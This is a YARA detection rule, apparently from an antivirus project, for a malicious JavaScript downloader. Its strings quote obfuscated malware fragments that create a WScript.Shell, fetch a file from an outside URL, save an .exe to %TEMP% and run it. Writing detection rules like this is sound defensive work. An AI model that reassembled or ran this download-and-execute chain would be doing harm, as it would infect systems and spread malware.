rule sig_20160330_b125eeb9e2f78536f29b5a1f264d5ef4 {
  meta:
    description = "datamaliciousorder - file 20160330_b125eeb9e2f78536f29b5a1f264d5ef4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "205159e9bee0f9bf4e2658cf8b3d4f4de99b888f809d46a6fe7d4eb2a89a24a6"

  strings:
    $s1  = "var B0 = function PD() {return WScript[AG](\"WScript\"+\".Shell\");}(), E0 = 11;" fullword ascii
    $s2  = "ZQ[B](\"GET\", \"http://new.teamlight.ru/si8svf\", false);" fullword ascii
    $s3  = "function J(Q, XO){I0 = I0 * 1; return Q - XO;};" fullword ascii
    $s4  = "if (ZQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function F() {return B0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"I0U6SN5qROMpuy.ex\" + \"e\";};" fullword ascii
    $s6  = "function X(){return TW + \"\";};" fullword ascii
    $s7  = "function I(VA){B0[\"Run\"](VA, I0, I0);};" fullword ascii
    $s8  = "function L() {return ((XC == true) && (XC == AI)) ? 1 : I0;};" fullword ascii
    $s9  = "var W = new this[\"Date\"]();" fullword ascii
    $s10 = "function M(){return 22;};" fullword ascii
    $s11 = "function L1()" fullword ascii
    $s12 = "}while (M0);" fullword ascii
    $s13 = "function L0(DL) {var TP = (1, 2, 3, 4, 5, DL); return TP;};" fullword ascii
    $s14 = "return J(E, YO);" fullword ascii
    $s15 = "function V(){return AG;};" fullword ascii
    $s16 = "var W0 = false;" fullword ascii
    $s17 = "XC = true; " fullword ascii
    $s18 = "AI = true; " fullword ascii
    $s19 = "var XC = false;" fullword ascii
    $s20 = "var AI = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}